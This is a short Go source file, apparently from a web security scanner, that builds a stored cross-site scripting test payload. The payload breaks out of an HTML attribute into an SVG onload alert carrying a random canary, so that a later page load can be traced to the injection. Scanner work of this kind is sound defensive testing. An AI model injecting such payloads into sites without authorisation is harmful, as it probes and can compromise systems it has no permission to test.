package xss_stored

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
)

const canaryLen = 6

// Payload is a single stored-XSS attempt. The canary appears verbatim inside
// the alert() argument so a fired dialog (on a later page load) can be tied
// back to this specific injection.
type Payload struct {
	Canary string
	Body   string // injected into the insertion point
}

func NewPayload() (*Payload, error) {
	buf := make([]byte, canaryLen)
	if _, err := rand.Read(buf); err != nil {
		return nil, err
	}
	canary := "vig-sx-" + hex.EncodeToString(buf)
	body := fmt.Sprintf(`"'><svg/onload=alert(%q)>//`, canary)
	return &Payload{Canary: canary, Body: body}, nil
}
